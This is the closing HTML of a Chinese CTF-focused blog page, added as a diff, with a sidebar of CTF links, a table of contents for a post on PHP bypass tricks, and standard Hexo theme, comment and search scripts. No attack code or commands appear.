+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">gtfly</p>
+              <p class="site-description motion-element" itemprop="description">轻描时光漫长低唱语焉不详.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">151</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.bugku.com/login?next=challenges" title="Bugku" target="_blank">Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://new.bugku.com/" title="new Bugku" target="_blank">new Bugku</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.linkedbyx.com/home" title="X计划平台" target="_blank">X计划平台</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.shiyanbar.com/ctf/practice" title="实验吧" target="_blank">实验吧</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctf.jasec.cn/index.php?page=login" title="Jactf" target="_blank">Jactf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.jarvisoj.com/login" title="Javis" target="_blank">Javis</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://cgctf.nuptsast.com/challenges#Web" title="CGctf" target="_blank">CGctf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://xz.aliyun.com/" title="先知社区" target="_blank">先知社区</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.ssleye.com/" title="ctf在线工具" target="_blank">ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://ctf.194nb.com/" title="aman ctf在线工具" target="_blank">aman ctf在线工具</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ctfwp.com/" title="ctfwp" target="_blank">ctfwp</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#glob模式"><span class="nav-number">1.</span> <span class="nav-text">glob模式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bin目录"><span class="nav-number">2.</span> <span class="nav-text">/bin目录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php的一些运算流程、特性"><span class="nav-number">3.</span> <span class="nav-text">php的一些运算流程、特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#异或符"><span class="nav-number">3.1.</span> <span class="nav-text">异或符(^)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#取反符"><span class="nav-number">3.2.</span> <span class="nav-text">取反符(~)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#弱类型"><span class="nav-number">3.3.</span> <span class="nav-text">弱类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#递增-递减运算符"><span class="nav-number">3.4.</span> <span class="nav-text">递增/递减运算符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#反引号"><span class="nav-number">3.5.</span> <span class="nav-text">反引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可变函数"><span class="nav-number">3.6.</span> <span class="nav-text">可变函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#短标签"><span class="nav-number">3.7.</span> <span class="nav-text">短标签</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#极限利用-代码分析"><span class="nav-number">4.</span> <span class="nav-text">极限利用-代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#方法一-调用可变函数"><span class="nav-number">4.1.</span> <span class="nav-text">方法一.调用可变函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法二-调用动态函数"><span class="nav-number">4.2.</span> <span class="nav-text">方法二.调用动态函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法三-构造超全局数组变量"><span class="nav-number">4.3.</span> <span class="nav-text">方法三.构造超全局数组变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法四-读取linux文件"><span class="nav-number">4.4.</span> <span class="nav-text">方法四.读取linux文件</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        ﻿<div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="heart">
+    <i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gtfly</span>
+
+ <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+ <script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/16/2018 12:49:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "已存在 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+ setInterval("createtime()",250);
+ </script>
+
+<!--
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count"></span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+-->
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </div></footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item=>{
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: '9Pgz8ir0b40IXQ5V3bjRc8m0-gzGzoHsz',
+        appKey: 'VCCuCSQHpPqX3hmOh0PlmfXu',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        guest_info:guest,
+        pageSize:'10' || 10,
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+ <!-- ҳ����С���� -->
+ <script type="text/javascript" src="/js/src/love.js"></script>
+
+  
+  
+  <!--������ƭ-->
+ <script type="text/javascript" src="/js/src/crash_cheat.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-backstretch/2.0.4/jquery.backstretch.min.js"></script>
+  <script>
+  $("body").backstretch("https://myqinshimoon.github.io/background.jpg");
+  </script>
+
+
+</body>
+</html>
